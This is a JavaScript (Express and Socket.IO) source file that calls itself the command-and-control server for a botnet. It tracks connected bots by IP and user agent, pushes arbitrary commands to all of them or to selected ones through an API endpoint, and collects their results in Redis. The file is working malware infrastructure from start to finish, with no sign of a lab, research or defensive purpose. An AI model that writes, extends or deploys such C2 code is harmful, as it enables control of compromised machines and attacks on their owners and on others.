/**
 * Command & Control Server
 * 
 * This server manages the botnet, distributing commands to agents and
 * collecting results for analysis.
 */

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const Redis = require('redis');
const { v4: uuidv4 } = require('uuid');
const winston = require('winston');
const dotenv = require('dotenv');

// Load environment variables
dotenv.config({ path: '../../config/.env' });

// Configure logger
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  defaultMeta: { service: 'c2-server' },
  transports: [
    new winston.transports.File({ filename: 'logs/error.log', level: 'error' }),
    new winston.transports.File({ filename: 'logs/combined.log' }),
    new winston.transports.Console()
  ]
});

// Initialize Express app
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Initialize Redis client
const redisClient = Redis.createClient({
  url: process.env.REDIS_URL || 'redis://localhost:6379'
});

// Connect to Redis
(async () => {
  try {
    await redisClient.connect();
    logger.info('Connected to Redis');
  } catch (err) {
    logger.error('Redis connection error:', err);
  }
})();

// Store active bots
const activeBots = new Map();

// API for command distribution
app.use(express.json());

// Middleware to check API key
const checkApiKey = (req, res, next) => {
  const apiKey = req.headers['x-api-key'];
  if (!apiKey || apiKey !== process.env.API_KEY) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', activeBots: activeBots.size });
});

// Get status of all bots
app.get('/api/bots', checkApiKey, (req, res) => {
  const botsArray = Array.from(activeBots.entries()).map(([id, bot]) => ({
    id,
    lastSeen: bot.lastSeen,
    ip: bot.ip,
    userAgent: bot.userAgent,
    status: bot.status
  }));
  
  res.json({ bots: botsArray });
});

// Send command to all bots
app.post('/api/command', checkApiKey, (req, res) => {
  const { command, params, targetIds } = req.body;
  
  if (!command) {
    return res.status(400).json({ error: 'Command is required' });
  }
  
  const commandId = uuidv4();
  const timestamp = Date.now();
  
  const commandObj = {
    id: commandId,
    command,
    params: params || {},
    timestamp
  };
  
  // Store command in Redis
  redisClient.hSet('commands', commandId, JSON.stringify(commandObj));
  
  // If target IDs specified, send only to those bots
  if (targetIds && Array.isArray(targetIds) && targetIds.length > 0) {
    targetIds.forEach(id => {
      if (activeBots.has(id)) {
        io.to(id).emit('command', commandObj);
      }
    });
    logger.info(`Command ${command} sent to ${targetIds.length} specific bots`);
    return res.json({ success: true, commandId, targetCount: targetIds.length });
  }
  
  // Otherwise broadcast to all bots
  io.emit('command', commandObj);
  logger.info(`Command ${command} broadcast to all bots (${activeBots.size})`);
  
  res.json({ success: true, commandId, targetCount: activeBots.size });
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  const botId = socket.id;
  const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  const userAgent = socket.handshake.headers['user-agent'];
  
  logger.info(`Bot connected: ${botId} from ${ip}`);
  
  // Register the bot
  activeBots.set(botId, {
    id: botId,
    ip,
    userAgent,
    lastSeen: Date.now(),
    status: 'idle'
  });
  
  // Handle bot reporting results
  socket.on('result', async (data) => {
    const { commandId, result, error } = data;
    
    logger.info(`Result received from bot ${botId} for command ${commandId}`);
    
    // Update bot status
    const bot = activeBots.get(botId);
    if (bot) {
      bot.lastSeen = Date.now();
      bot.status = 'idle';
      activeBots.set(botId, bot);
    }
    
    // Store result in Redis
    const resultId = uuidv4();
    const resultObj = {
      id: resultId,
      botId,
      commandId,
      result,
      error,
      timestamp: Date.now()
    };
    
    await redisClient.hSet('results', resultId, JSON.stringify(resultObj));
    await redisClient.lPush(`bot:${botId}:results`, resultId);
    await redisClient.lPush(`command:${commandId}:results`, resultId);
  });
  
  // Handle bot status updates
  socket.on('status', (data) => {
    const { status } = data;
    
    const bot = activeBots.get(botId);
    if (bot) {
      bot.lastSeen = Date.now();
      bot.status = status;
      activeBots.set(botId, bot);
    }
  });
  
  // Handle disconnection
  socket.on('disconnect', () => {
    logger.info(`Bot disconnected: ${botId}`);
    activeBots.delete(botId);
  });
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  logger.info(`C2 Server listening on port ${PORT}`);
});

// Clean up resources on shutdown
process.on('SIGINT', async () => {
  logger.info('Shutting down C2 server...');
  await redisClient.quit();
  server.close();
  process.exit(0);
});

// Export for testing
module.exports = { app, server, io, redisClient };
